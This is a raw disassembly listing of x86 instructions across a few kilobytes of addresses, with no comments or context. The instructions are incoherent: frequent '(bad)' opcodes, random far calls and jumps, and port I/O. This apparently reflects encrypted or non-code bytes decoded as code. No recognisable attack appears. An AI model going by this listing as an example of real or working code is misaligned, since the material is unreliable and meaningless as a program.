  403ec0:	sub    DWORD PTR cs:[edx+0x4c22e316],ebx
  403ec7:	(bad)
  403eca:	jle    0x403e71
  403ecc:	es aas 
  403ece:	jae    0x403e5f
  403ed0:	sbb    BYTE PTR [edi+0x5a],0xff
  403ed4:	push   edi
  403ed5:	jmp    0x403ea9
  403ed7:	xchg   edx,eax
  403ed8:	ins    DWORD PTR es:[edi],dx
  403ed9:	or     edx,DWORD PTR [edi]
  403edb:	retf   0x5c15
  403ede:	xchg   edx,eax
  403edf:	lds    esi,FWORD PTR [edx]
  403ee1:	or     eax,DWORD PTR [esi-0x26]
  403ee4:	repnz fistp QWORD PTR [ecx]
  403ee7:	cmp    bh,bh
  403ee9:	js     0x403e90
  403eeb:	pop    es
  403eec:	rcl    DWORD PTR [edx+eax*2-0x294b0d80],cl
  403ef3:	pop    ecx
  403ef4:	jbe    0x403f3a
  403ef6:	shl    BYTE PTR [edi-0x5c119776],0x25
  403efd:	fidiv  WORD PTR [esi+0x61]
  403f00:	mov    dl,0x22
  403f02:	mov    cl,0x8f
  403f04:	fild   WORD PTR ds:0x79e22ef5
  403f0a:	cmp    esi,DWORD PTR [edi]
  403f0c:	lock or eax,DWORD PTR [edi+0x61b43532]
  403f13:	mov    ds:0xb79ad72f,al
  403f18:	inc    eax
  403f19:	mov    ds:0xbcd78c9d,eax
  403f1e:	lea    esp,[edi+0x3fca0a4a]
  403f24:	shr    esp,1
  403f26:	ins    BYTE PTR es:[edi],dx
  403f27:	call   0xdd5b67de
  403f2c:	inc    edx
  403f2d:	bswap  ebp
  403f2f:	xchg   ebx,eax
  403f30:	and    al,0xf7
  403f32:	cld    
  403f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f34:	pop    ebp
  403f35:	and    BYTE PTR [ebp+ebp*4-0x7adbbf82],dh
  403f3c:	mov    dl,0xfa
  403f3e:	int3   
  403f3f:	daa    
  403f40:	xchg   esi,eax
  403f41:	jae    0x403f2b
  403f43:	imul   eax,DWORD PTR [ebp+0xb],0x206fdec1
  403f4a:	cwde   
  403f4b:	jo     0x403f39
  403f4d:	inc    ebp
  403f4e:	call   0xc62b:0xaca20242
  403f55:	adc    esp,DWORD PTR [ebx-0x59]
  403f58:	fiadd  DWORD PTR [edi-0x22]
  403f5b:	add    cl,bh
  403f5d:	js     0x403ef3
  403f5f:	push   ecx
  403f60:	mov    dl,0xd9
  403f62:	add    al,0x81
  403f64:	or     BYTE PTR [esp+ebx*1+0x7547e4d3],cl
  403f6b:	adc    esi,DWORD PTR [ecx-0x25925ad9]
  403f71:	fbstp  TBYTE PTR [edx-0x45]
  403f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f75:	enter  0x999a,0xcc
  403f79:	push   0xffffffa3
  403f7b:	int3   
  403f7c:	pusha  
  403f7d:	loopne 0x403f49
  403f7f:	stos   DWORD PTR es:[edi],eax
  403f80:	neg    BYTE PTR [ecx+0x6c]
  403f83:	xchg   DWORD PTR [esp+ebx*8],eax
  403f86:	mov    WORD PTR [eax-0x646628e1],ds
  403f8c:	adc    al,0x69
  403f8e:	pop    ebx
  403f8f:	xor    eax,0x764f8aa1
  403f94:	fldenv [ecx]
  403f96:	data16 jl 0x403fb6
  403f99:	in     eax,0xa
  403f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f9c:	into   
  403f9d:	popa   
  403f9e:	mov    edi,0x8824559b
  403fa3:	scas   al,BYTE PTR es:[edi]
  403fa4:	mov    ebp,0x7a119851
  403fa9:	dec    ebx
  403faa:	inc    ebp
  403fab:	cmp    eax,0xba5c4a99
  403fb0:	dec    eax
  403fb1:	jl     0x403f90
  403fb3:	es retf 0x9296
  403fb7:	mov    ?,WORD PTR [eax-0x4dd16921]
  403fbd:	pop    ds
  403fbe:	inc    ebp
  403fbf:	ror    BYTE PTR [edx+0x38],cl
  403fc2:	or     ebp,0x7ec0c69
  403fc8:	xor    esi,DWORD PTR ds:0xaf56b758
  403fce:	mov    DWORD PTR [edx+esi*4],ebp
  403fd1:	test   eax,0x32927ff6
  403fd6:	mov    dl,0x19
  403fd8:	lods   al,BYTE PTR ds:[esi]
  403fd9:	or     esi,DWORD PTR ds:0xdf668038
  403fdf:	into   
  403fe0:	sbb    BYTE PTR [edx-0x67],dl
  403fe3:	mov    esp,0xd339f227
  403fe8:	or     BYTE PTR [ebx+0xb8dad73],al
  403fee:	fxch   st(2)
  403ff0:	outs   dx,DWORD PTR ds:[esi]
  403ff1:	dec    edx
  403ff2:	data16 mov ch,0x6
  403ff5:	fdiv   QWORD PTR [esi+ebx*2+0x3e9ae949]
  403ffc:	ror    BYTE PTR [esp-0x42],1
  404000:	iret   
  404001:	or     ah,cl
  404003:	push   ebx
  404004:	enter  0x7a0e,0xfc
  404008:	dec    eax
  404009:	mov    eax,edx
  40400b:	fs pop es
  40400d:	inc    esi
  40400e:	cmp    DWORD PTR [edi],edi
  404010:	pop    edx
  404011:	or     ecx,DWORD PTR [edi]
  404013:	dec    ecx
  404014:	mov    ch,0x39
  404016:	popa   
  404017:	sbb    edx,DWORD PTR [esi*4-0x3e105e66]
  40401e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40401f:	js     0x403fce
  404021:	jmp    0x84bffa75
  404026:	cmp    edi,DWORD PTR [ecx]
  404028:	loopne 0x404074
  40402a:	dec    ecx
  40402b:	mov    al,ds:0x63163859
  404030:	mov    dh,0x86
  404032:	call   0x2ee5:0x782406fe
  404039:	enter  0xa7d5,0x92
  40403d:	pop    ss
  40403e:	mov    DWORD PTR [ecx+0x9],ebx
  404041:	xor    eax,ecx
  404043:	lods   eax,DWORD PTR ds:[esi]
  404044:	mov    cl,0xfc
  404046:	ror    BYTE PTR [ebx+0x17cfe4eb],cl
  40404c:	xor    al,0xec
  40404e:	xor    edx,ecx
  404050:	aaa    
  404051:	or     esp,ebx
  404053:	mov    ebx,0x1af4f9b
  404058:	push   ds
  404059:	dec    eax
  40405a:	call   0x9005:0x53f775f7
  404061:	mov    eax,ds:0xac28a7a9
  404066:	add    eax,0x37ce4f0e
  40406b:	jle    0x40401f
  40406d:	test   DWORD PTR [esi-0x6cecafba],eax
  404073:	cdq    
  404074:	push   ds
  404075:	or     edx,edi
  404077:	inc    BYTE PTR [esi+0x413ae556]
  40407d:	ins    DWORD PTR es:[edi],dx
  40407e:	popf   
  40407f:	sub    bh,BYTE PTR ds:0xf1db7bef
  404085:	lock push ebx
  404087:	daa    
  404088:	retf   0xb759
  40408b:	mov    al,ds:0xad63858e
  404090:	inc    eax
  404091:	dec    ebx
  404092:	pop    DWORD PTR [edx]
  404094:	jg     0x404114
  404096:	call   0xd0b9:0xe96d2b4b
  40409d:	les    esp,FWORD PTR [ecx-0x5d]
  4040a0:	pusha  
  4040a1:	xchg   BYTE PTR [esi+0x3acb87e2],ah
  4040a7:	inc    DWORD PTR [edx+0x73f09aff]
  4040ad:	retf   
  4040ae:	mov    cl,0x30
  4040b0:	mov    dh,BYTE PTR [eax]
  4040b2:	dec    ecx
  4040b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040b4:	adc    eax,0x91b068ba
  4040b9:	out    0x4e,al
  4040bb:	outs   dx,DWORD PTR ds:[esi]
  4040bc:	xchg   edx,eax
  4040bd:	test   BYTE PTR [edx+0x71b32c02],bl
  4040c3:	xchg   edx,eax
  4040c4:	bound  edx,QWORD PTR [ebx]
  4040c6:	inc    esp
  4040c7:	fstp   QWORD PTR [esi]
  4040c9:	int3   
  4040ca:	inc    esp
  4040cb:	add    edi,DWORD PTR [edi-0x75]
  4040ce:	sbb    eax,0x9a15b826
  4040d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d4:	jns    0x40407f
  4040d6:	es xchg ecx,eax
  4040d8:	loopne 0x4040ac
  4040da:	out    dx,al
  4040db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040dc:	adc    DWORD PTR [esi+0x14],ebx
  4040df:	mov    esi,ds
  4040e1:	int3   
  4040e2:	retf   
  4040e3:	inc    ebp
  4040e4:	mov    dl,0x7b
  4040e6:	mov    bl,0xbc
  4040e8:	sbb    eax,0x9d748508
  4040ed:	or     edi,DWORD PTR [esp+ebp*2+0x4b14d4d1]
  4040f4:	lea    ecx,[ecx]
  4040f6:	mov    eax,ds:0x63421e0
  4040fb:	ror    edi,cl
  4040fd:	aad    0x9a
  4040ff:	xor    eax,0x26a8b06f
  404104:	xor    al,0x6
  404106:	out    dx,al
  404107:	or     ebx,0xffffff93
  40410a:	and    DWORD PTR [edi-0x36389f70],0x719a5972
  404114:	sbb    ch,ch
  404116:	sub    eax,DWORD PTR [edi-0x6e]
  404119:	out    dx,al
  40411a:	shl    BYTE PTR [edi+0x1c8f5896],0x2c
  404121:	inc    edi
  404122:	mov    ebx,0x248b2ab
  404127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404128:	sti    
  404129:	ds push eax
  40412b:	fimul  DWORD PTR [edi]
  40412d:	or     BYTE PTR [eax],dl
  40412f:	imul   ebp,eax,0x62e5e5e2
  404135:	sbb    BYTE PTR [ecx],bh
  404137:	pop    ecx
  404138:	cli    
  404139:	sub    dl,BYTE PTR [edx-0x1f30f859]
  40413f:	shl    BYTE PTR [edi-0x68586cee],0x4c
  404146:	pop    ds
  404147:	bound  esi,QWORD PTR [eax+0x77]
  40414a:	sub    edx,DWORD PTR [edx+esi*4]
  40414d:	xor    al,0xcb
  40414f:	je     0x40410b
  404151:	xchg   ebp,eax
  404152:	rcr    bh,1
  404154:	sub    cl,BYTE PTR [ebx]
  404156:	fisubr DWORD PTR [esi]
  404158:	pushf  
  404159:	int3   
  40415a:	pop    edi
  40415b:	fist   DWORD PTR [edi+ebx*1]
  40415e:	call   0x7b5:0x938bc552
  404165:	cmp    ecx,DWORD PTR [ebx]
  404167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404168:	out    dx,al
  404169:	cmp    dl,dl
  40416b:	mov    ?,eax
  40416d:	fadd   DWORD PTR [eax+0x1f4db156]
  404173:	shl    BYTE PTR [eax],0xff
  404176:	fwait
  404177:	outs   dx,DWORD PTR ds:[esi]
  404178:	sub    DWORD PTR [ebx],edx
  40417a:	jmp    0xca5c1e26
  40417f:	lahf   
  404180:	loope  0x404155
  404182:	sbb    al,0xac
  404184:	inc    edx
  404185:	scas   eax,DWORD PTR es:[edi]
  404186:	call   0x5a92:0x624857a4
  40418d:	sbb    al,0xb3
  40418f:	mov    al,ds:0xb8f3fda0
  404194:	inc    esi
  404195:	pop    ebx
  404196:	jp     0x4041dd
  404198:	fstp   QWORD PTR [edx]
  40419a:	call   0xb571:0xc0b383a4
  4041a1:	mov    dh,0x4e
  4041a3:	pop    ebx
  4041a4:	dec    esp
  4041a5:	or     al,0x83
  4041a7:	add    DWORD PTR [edx],eax
  4041a9:	clc    
  4041aa:	cli    
  4041ab:	xchg   edi,eax
  4041ac:	test   BYTE PTR [eax],0x8e
  4041af:	es mov cl,0x0
  4041b2:	pop    ebp
  4041b3:	lea    ecx,[edx-0x75]
  4041b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b7:	(bad)  
  4041b9:	inc    ebp
  4041ba:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4041bc:	adc    al,0xa9
  4041be:	out    dx,al
  4041bf:	stos   BYTE PTR es:[edi],al
  4041c0:	pop    esi
  4041c1:	sub    DWORD PTR [edi],ebx
  4041c3:	or     al,0xc6
  4041c5:	and    al,0x9a
  4041c7:	inc    ebx
  4041c8:	imul   eax,DWORD PTR [ebx],0x6d2269ab
  4041ce:	lods   al,BYTE PTR ds:[esi]
  4041cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d0:	pop    edx
  4041d1:	pop    ecx
  4041d2:	xchg   ecx,eax
  4041d3:	repnz or ah,0x45
  4041d7:	mul    ecx
  4041d9:	jo     0x4041ae
  4041db:	out    0xb1,al
  4041dd:	pop    ebp
  4041de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041df:	jmp    0x28b34354
  4041e4:	and    BYTE PTR [eax+0x74],0x0
  4041e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041e9:	or     eax,DWORD PTR [eax+edi*8-0x55585066]
  4041f0:	inc    eax
  4041f1:	dec    ecx
  4041f2:	call   0xa4f:0xdf69b575
  4041f9:	mov    edi,0xe186a74a
  4041fe:	push   ds
  4041ff:	push   ss
  404200:	inc    edx
  404201:	push   0x36
  404203:	dec    esi
  404204:	mov    dl,0x7c
  404206:	xor    DWORD PTR [edx-0x43150beb],eax
  40420c:	push   es
  40420d:	pop    ss
  40420e:	add    eax,0xf78bef9a
  404213:	pop    ecx
  404214:	fnstcw WORD PTR [esi+0x5c]
  404217:	xor    eax,0xdd49b2b5
  40421c:	into   
  40421d:	sbb    eax,0x13df48a
  404222:	mov    eax,ds:0x3c23e6a7
  404227:	jmp    0x2994f285
  40422c:	mov    dl,0x3f
  40422e:	sub    dh,dh
  404230:	call   DWORD PTR [edx+ecx*4-0x11]
  404234:	sbb    al,0xf5
  404236:	jbe    0x4041f2
  404238:	inc    esi
  404239:	mov    esp,edx
  40423b:	addr16 jo 0x40423a
  40423e:	pusha  
  40423f:	xor    eax,0xe59b4865
  404244:	nop
  404245:	test   BYTE PTR ds:0x528b2e76,al
  40424b:	mov    cl,0xd6
  40424d:	or     edx,DWORD PTR [esi]
  40424f:	pop    ecx
  404250:	out    dx,eax
  404251:	jae    0x40429b
  404253:	into   
  404254:	mov    ch,0x8e
  404256:	call   0x5a83:0x39d4a32
  40425d:	jnp    0x4041ef
  40425f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404260:	lods   eax,DWORD PTR ds:[esi]
  404261:	and    eax,0xd219f939
  404266:	jbe    0x404252
  404268:	mov    esp,0x1c1a257e
  40426d:	stos   DWORD PTR es:[edi],eax
  40426e:	enter  0xc87,0x2e
  404272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404274:	jno    0x4042d7
  404276:	pop    ebx
  404277:	pop    edi
  404278:	inc    edi
  404279:	mov    al,ds:0xabb2bc2c
  40427e:	cs jb  0x404284
  404281:	dec    ecx
  404282:	ret    
  404283:	mov    ch,0x40
  404285:	or     eax,esi
  404287:	add    ebp,DWORD PTR [ebp-0x770f2ad1]
  40428d:	dec    eax
  40428e:	jbe    0x4042d0
  404290:	mov    dl,0x54
  404292:	pop    esp
  404293:	inc    edi
  404294:	add    BYTE PTR [edi+0x7c7b7ac3],al
  40429a:	cmp    eax,0x3f938489
  40429f:	sbb    eax,0xfb9c132
  4042a4:	stc    
  4042a5:	adc    eax,0x1aca7223
  4042aa:	cwde   
  4042ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ac:	mov    bl,0xf8
  4042ae:	or     eax,0x66b7c48
  4042b3:	nop
  4042b4:	ins    BYTE PTR es:[edi],dx
  4042b5:	or     esi,esi
  4042b7:	std    
  4042b8:	scas   al,BYTE PTR es:[edi]
  4042b9:	mov    ds:0x35624b59,eax
  4042be:	(bad)  
  4042bf:	test   ebp,ecx
  4042c1:	or     ch,BYTE PTR [ebx+0x6116b772]
  4042c7:	push   ecx
  4042c8:	xchg   edx,eax
  4042c9:	ss push ebx
  4042cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cc:	(bad)  
  4042cd:	mov    al,ds:0x5dd7a540
  4042d2:	imul   esi,DWORD PTR [ecx-0x4e],0xffffffa3
  4042d6:	xchg   edx,eax
  4042d7:	pushf  
  4042d8:	inc    esi
  4042d9:	dec    ebp
  4042da:	sub    BYTE PTR [eax-0x2efff480],bh
  4042e0:	inc    eax
  4042e1:	and    bl,ah
  4042e3:	sub    al,0xa3
  4042e5:	adc    DWORD PTR [edx+0x6252ee18],ebx
  4042eb:	sub    dh,BYTE PTR [ecx-0x1e]
  4042ee:	inc    ebp
  4042ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f0:	arpl   WORD PTR [edx+0x10],cx
  4042f3:	sub    dl,0x93
  4042f6:	fstp   DWORD PTR [edi+0x74f40fa4]
  4042fc:	mov    dl,0x44
  4042fe:	dec    edx
  4042ff:	sar    ecx,1
  404301:	mov    ah,0xa8
  404303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404304:	xor    al,0x90
  404306:	aam    0x97
  404308:	inc    ecx
  404309:	loop   0x404332
  40430b:	mov    DWORD PTR [edi+0x311082dd],ebp
  404311:	aaa    
  404312:	mov    cl,0xff
  404314:	cwde   
  404315:	jmp    0x404303
  404317:	ret    
  404318:	ror    BYTE PTR [ebx],0x9c
  40431b:	fadd   QWORD PTR [esi]
  40431d:	retf   
  40431e:	je     0x404323
  404320:	retf   0x9a13
  404323:	and    DWORD PTR [eax-0x24],ecx
  404326:	es mov dl,0x70
  404329:	dec    edx
  40432a:	xor    BYTE PTR [edi-0x3358c808],ah
  404330:	inc    ebp
  404331:	imul   esi,DWORD PTR [esi],0x76
  404334:	lods   al,BYTE PTR ds:[esi]
  404335:	cmp    BYTE PTR [ebp+ecx*8+0x3d5920f2],dl
  40433c:	in     al,0x2f
  40433e:	add    ah,BYTE PTR [esi+ecx*8+0x66515421]
  404345:	sub    BYTE PTR [edx+0x1b],0xd4
  404349:	sub    bl,BYTE PTR [ebp-0x291f07c8]
  40434f:	shl    DWORD PTR [edx+0x2079e5e6],cl
  404355:	psrld  mm3,QWORD PTR [edx]
  404358:	nop
  404359:	mov    ebp,eax
  40435b:	daa    
  40435c:	call   0xbd30f07c
  404361:	xchg   ecx,eax
  404362:	ret    0x1842
  404365:	mov    DWORD PTR [ebp+0x34],edi
  404368:	dec    ebx
  404369:	imul   edx,DWORD PTR [esi-0x1bf45676],0xffffffcd
  404370:	mov    ebx,0x92ca76b8
  404375:	stc    
  404376:	call   0xcbe3:0xf2a89392
  40437d:	ror    DWORD PTR [edi],cl
  40437f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404380:	test   DWORD PTR [edx+edx*2-0x57],0xe7cc1514
  404388:	add    ebp,DWORD PTR [esi]
  40438a:	mov    BYTE PTR [ecx-0x270afb4f],cl
  404390:	push   cs
  404391:	mov    ch,0x13
  404393:	pop    ss
  404394:	test   al,0x13
  404396:	xor    eax,0x71bed9a7
  40439b:	in     eax,0xfa
  40439d:	fcmovnbe st,st(0)
  40439f:	cmp    DWORD PTR [ecx+0x70e214a3],esi
  4043a5:	popa   
  4043a6:	mov    DWORD PTR [edi+0x7e],ecx
  4043a9:	icebp  
  4043aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ac:	mov    eax,0xbb901655
  4043b1:	ja     0x40439d
  4043b3:	ss mov dl,0x8b
  4043b6:	push   cs
  4043b7:	ret    0x3f14
  4043ba:	cmp    DWORD PTR [edx+0x10],ebx
  4043bd:	or     esi,edi
  4043bf:	cs mov ah,0xeb
  4043c2:	pop    esi
  4043c3:	cmc    
  4043c4:	inc    esi
  4043c5:	push   0xffffffe7
  4043c7:	out    0xb2,al
  4043c9:	add    cl,bh
  4043cb:	mov    WORD PTR [ebp+0x3e],gs
  4043ce:	mov    bh,0x4b
  4043d0:	mov    cl,0xc
  4043d2:	sub    BYTE PTR [edx-0x54],ch
  4043d5:	sub    dl,ah
  4043d7:	ja     0x4043e3
  4043d9:	jb     0x404405
  4043db:	jno    0x40438f
  4043dd:	data16 xlat BYTE PTR ds:[ebx]
  4043df:	int    0xae
  4043e1:	into   
  4043e2:	je     0x404372
  4043e4:	inc    ebx
  4043e5:	or     esi,DWORD PTR [edi]
  4043e7:	loopne 0x40438b
  4043e9:	add    BYTE PTR [edx],bl
  4043eb:	sub    BYTE PTR ds:0x911b9a56,ah
  4043f1:	mov    ch,0x4d
  4043f3:	mov    al,0x99
  4043f5:	out    0x69,al
  4043f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043f8:	or     BYTE PTR [ebx-0x41d3797a],dl
  4043fe:	fnsave [ecx-0x30a5e04d]
  404404:	jae    0x404424
  404406:	inc    eax
  404407:	call   0xa0e6888e
  40440c:	jns    0x404397
  40440e:	inc    esp
  40440f:	fs or  al,0xdc
  404412:	cmp    al,BYTE PTR [esi-0x47]
  404415:	add    al,0xd9
  404417:	dec    edi
  404418:	in     eax,0x6c
  40441a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40441b:	pop    ss
  40441c:	add    DWORD PTR [ebx+0x562ac9a3],ecx
  404422:	rcl    ah,cl
  404424:	or     bh,BYTE PTR es:[edi+0x37]
  404428:	add    eax,0xfe4b7773
  40442d:	in     al,0x21
  40442f:	jnp    0x40443b
  404431:	pop    ss
  404432:	sbb    bh,cl
  404434:	mov    DWORD PTR ds:0xa17d2797,edi
  40443a:	adc    al,0x8f
  40443c:	lods   eax,DWORD PTR ds:[esi]
  40443d:	ficomp DWORD PTR [ebx]
  40443f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404440:	add    eax,0xae8b7d77
  404445:	or     al,0xde
  404447:	mov    eax,ds:0x3b0dccb2
  40444c:	loope  0x40445f
  40444e:	popa   
  40444f:	shr    DWORD PTR [ebx+0x34],0xd5
  404453:	mov    dl,0x1e
  404455:	sub    eax,0x935a7ed
  40445a:	rol    BYTE PTR [edx-0x2],cl
  40445d:	add    al,0x9a
  40445f:	mov    ebx,0x40c20e3c
  404464:	push   0x98a79b5f
  404469:	aaa    
  40446a:	jo     0x404464
  40446c:	leave  
  40446d:	int3   
  40446e:	stc    
  40446f:	sub    esi,DWORD PTR [edx+0x2afd639c]
  404475:	in     eax,0xea
  404477:	ja     0x404495
  404479:	or     eax,DWORD PTR [ebx]
  40447b:	push   edx
  40447c:	adc    ch,BYTE PTR [ecx]
  40447e:	push   es
  40447f:	xchg   BYTE PTR [ecx+0x67],bl
  404482:	fwait
  404483:	out    dx,al
  404484:	dec    ecx
  404485:	das    
  404486:	xor    BYTE PTR [eax],dh
  404488:	lods   al,BYTE PTR ds:[esi]
  40448a:	inc    edx
  40448b:	jle    0x404422
  40448d:	pop    ss
  40448e:	add    eax,0x2f0b235b
  404493:	push   ecx
  404494:	push   esp
  404495:	jmp    0x404490
  404497:	daa    
  404498:	mov    ch,0x77
  40449a:	scas   eax,DWORD PTR es:[edi]
  40449b:	aad    0x4b
  40449d:	xor    BYTE PTR [edx],bh
  40449f:	fdecstp 
  4044a1:	xlat   BYTE PTR es:[ebx]
  4044a3:	mov    ds:0x1c92aa91,eax
  4044a8:	mov    ch,0xb3
  4044aa:	mov    ebp,0xc8e56ba7
  4044af:	mov    ebp,0x9981164a
  4044b4:	(bad)  [edx]
  4044b6:	adc    al,0x56
  4044b8:	dec    ecx
  4044b9:	(bad)  
  4044ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044bb:	addr16 das 
  4044bd:	sbb    ah,BYTE PTR [eax-0x78c80ccc]
  4044c3:	pop    ecx
  4044c4:	push   ss
  4044c5:	imul   ebx,DWORD PTR [edx],0x515876bc
  4044cb:	inc    ecx
  4044cc:	or     ecx,DWORD PTR [ebx]
  4044ce:	hlt    
  4044cf:	or     ebx,DWORD PTR [edi-0x5a]
  4044d2:	mov    eax,0xa1e4e3ca
  4044d7:	ds dec ebx
  4044d9:	or     ecx,DWORD PTR [ecx-0x41d58ade]
  4044df:	jmp    0xa7bcb89b
  4044e4:	sbb    DWORD PTR [edi+0x22],esi
  4044e7:	mov    BYTE PTR [ecx-0x4d85237b],dh
  4044ed:	popf   
  4044ee:	mov    eax,0xf8b27724
  4044f3:	repnz bound ecx,QWORD PTR [ebx]
  4044f6:	rol    DWORD PTR [ecx],1
  4044f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f9:	push   ecx
  4044fa:	inc    edx
  4044fb:	pop    ebp
  4044fc:	fcom   DWORD PTR [esi+0x66c4b99a]
  404502:	mov    eax,DWORD PTR ds:0xa72575f3
  404508:	push   ecx
  404509:	pop    eax
  40450a:	out    dx,eax
  40450b:	aad    0x29
  40450d:	push   es
  40450e:	push   ss
  40450f:	xor    DWORD PTR [ebx+0x1bda54e],0xffffffff
  404516:	adc    esi,ebp
  404518:	not    bp
  40451b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451c:	dec    ebp
  40451d:	or     BYTE PTR [ebx+0xa],dh
  404520:	into   
  404521:	es das 
  404523:	inc    esi
  404524:	mov    dl,0x4f
  404526:	sar    DWORD PTR [ebx-0x26],0x47
  40452a:	imul   eax,DWORD PTR [esp+edi*2-0x7308bff1],0xffffffb9
  404532:	je     0x40455a
  404534:	dec    edi
  404535:	jmp    0x404517
  404537:	xlat   BYTE PTR ds:[ebx]
  404538:	cmp    al,0x78
  40453a:	pusha  
  40453b:	push   ebp
  40453c:	mov    dl,0xf2
  40453e:	scas   al,BYTE PTR es:[edi]
  40453f:	push   edx
  404540:	xchg   ebx,eax
  404541:	out    0x7d,al
  404543:	cmp    al,0x31
  404545:	push   ebx
  404546:	xchg   ecx,eax
  404547:	mov    eax,ds:0x325d59b2
  40454c:	mov    eax,ds:0xaee8a493
  404551:	adc    BYTE PTR [ebp-0x13],0x32
  404555:	aam    0x3f
  404557:	std    
  404558:	sbb    DWORD PTR [ebx+0x2431a725],esi
  40455e:	xor    BYTE PTR [edi+0x32],0xb9
  404562:	push   cs
  404563:	imul   esi,DWORD PTR [edx-0x268cb7d3],0x16
  40456a:	mov    bl,0xfb
  40456c:	jge    0x404584
  40456e:	repz sbb al,0xdd
  404571:	retf   
  404572:	push   edi
  404573:	mov    al,0x1c
  404575:	test   DWORD PTR [esi+ebp*4],0xa45136b2
  40457c:	(bad)  
  40457d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40457e:	test   DWORD PTR [edx-0x43a9f472],edx
  404584:	sub    BYTE PTR [ebx],ah
  404586:	mov    esp,0x9a3cbda0
  40458b:	(bad)  
  40458c:	adc    ch,BYTE PTR [ecx-0x6499e70e]
  404592:	jg     0x40453b
  404594:	ja     0x40453b
  404596:	pop    ds
  404597:	adc    BYTE PTR [edx],bl
  404599:	imul   esi,eax,0xed4a8951
  40459f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a0:	jecxz  0x4045d6
  4045a2:	push   esp
  4045a3:	(bad)  [ebx]
  4045a5:	int    0x46
  4045a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a8:	(bad)  
  4045aa:	cmp    al,0x3f
  4045ac:	pop    esi
  4045ad:	add    al,0xb1
  4045af:	pop    eax
  4045b0:	mov    dl,0xde
  4045b2:	xchg   edx,eax
  4045b3:	adc    DWORD PTR [edi],edx
  4045b5:	push   esp
  4045b6:	xchg   esi,eax
  4045b7:	push   esi
  4045b8:	sbb    DWORD PTR [edi],edx
  4045ba:	jns    0x40462c
  4045bc:	mul    DWORD PTR [ebx]
  4045be:	pop    ebx
  4045bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c0:	aad    0x77
  4045c2:	pop    ecx
  4045c3:	scas   al,BYTE PTR es:[edi]
  4045c4:	adc    al,0x85
  4045c6:	loopne 0x40456d
  4045c8:	mov    dl,0xaa
  4045ca:	mov    eax,DWORD PTR [ebx]
  4045cc:	cmp    BYTE PTR [esi],bh
  4045ce:	push   cs
  4045cf:	inc    eax
  4045d0:	xor    cl,BYTE PTR [esi+ecx*2]
  4045d3:	stos   DWORD PTR es:[edi],eax
  4045d4:	mov    DWORD PTR ds:0x4fa594da,edx
  4045da:	and    dh,BYTE PTR [eax-0x73]
  4045dd:	jno    0x40457a
  4045df:	ret    0xabe5
  4045e2:	xor    edx,ecx
  4045e4:	and    ecx,0x42
  4045e7:	(bad)  
  4045e8:	nop
  4045e9:	out    0x42,eax
  4045eb:	mov    al,ds:0xa52402f9
  4045f0:	inc    eax
  4045f1:	mov    ebx,0x4f2c593d
  4045f6:	call   0xecee:0x78a3d494
  4045fd:	pop    es
  4045fe:	pusha  
  4045ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404600:	inc    edi
  404601:	adc    al,0x2a
  404603:	iret   
  404604:	sbb    esi,ebp
  404606:	add    bh,BYTE PTR [esi+ecx*2]
  404609:	inc    edi
  40460a:	call   0x85a2:0x28ea6965
  404611:	lods   al,BYTE PTR ds:[esi]
  404612:	jmp    0xc011:0x8426e89b
  404619:	retf   
  40461a:	popa   
  40461b:	mov    edi,DWORD PTR [edx-0x2]
  40461e:	add    eax,0xbbffb2ab
  404623:	hlt    
  404624:	rcl    BYTE PTR ds:0x2754b7b8,cl
  40462a:	pop    esi
  40462b:	mov    bl,0xc
  40462d:	or     edi,DWORD PTR [edi-0xd]
  404630:	std    
  404631:	pop    ss
  404632:	add    ch,cl
  404634:	mov    dl,0x99
  404636:	fwait
  404637:	push   0xddbe3eea
  40463c:	or     ebx,DWORD PTR gs:[ecx+0x56721431]
  404643:	fwait
  404644:	js     0x4046b3
  404646:	call   0x533f:0x1e23ce13
  40464d:	push   ds
  40464e:	adc    BYTE PTR [edi-0x28fbc34],dl
  404654:	sti    
  404655:	pop    ebp
  404656:	call   0x57cb:0x45e64bd7
  40465d:	ja     0x4046c4
  40465f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404660:	sub    eax,0xa3350a2a
  404665:	add    DWORD PTR [ebx],0x4b
  404668:	sbb    eax,0x376c9942
  40466d:	pop    bp
  40466f:	sar    DWORD PTR [ecx+0x462fa898],1
